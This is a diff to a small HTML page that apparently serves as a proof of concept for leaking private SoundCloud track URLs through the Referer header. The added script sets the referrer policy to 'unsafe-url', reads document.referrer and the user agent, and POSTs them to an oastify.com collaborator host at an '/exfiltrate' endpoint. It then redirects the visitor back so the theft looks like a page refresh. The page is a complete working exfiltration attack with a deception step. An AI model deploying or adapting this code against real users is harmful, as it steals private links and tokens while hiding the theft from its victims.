@@ -1,25 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <title>Loading Track...</title>
+    <meta name="referrer" content="unsafe-url"> <title>Checking Permissions...</title>
 </head>
 <body>
     <script>
-        fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/log', {
+        // CAPTURE: We grab the full URL of the private track directly
+        const secretData = {
+            alert: "PRIVATE_TOKEN_LEAKED",
+            secret_url: document.referrer, 
+            victim_ua: navigator.userAgent
+        };
+
+        // EXFILTRATE: Send it to your Oastify server
+        fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/exfiltrate', {
             method: 'POST',
-            mode: 'no-cors', 
-            body: JSON.stringify({
-                info: "Exploit Triggered",
-                // We grab it from JS just in case the header is still stripped
-                captured_referer: document.referrer, 
-                ua: navigator.userAgent
-            })
+            mode: 'no-cors',
+            body: JSON.stringify(secretData)
         });
 
+        // STEALTH: Send them back to the track so they think it was a refresh
         setTimeout(() => {
-            window.location.href = "https://soundcloud.com/hobnobclanandthereflux/testofnoah";
-        }, 1200);
+            window.location.href = document.referrer || "https://soundcloud.com";
+        }, 800);
     </script>
+    <p>Verifying track access...</p>
 </body>
 </html>
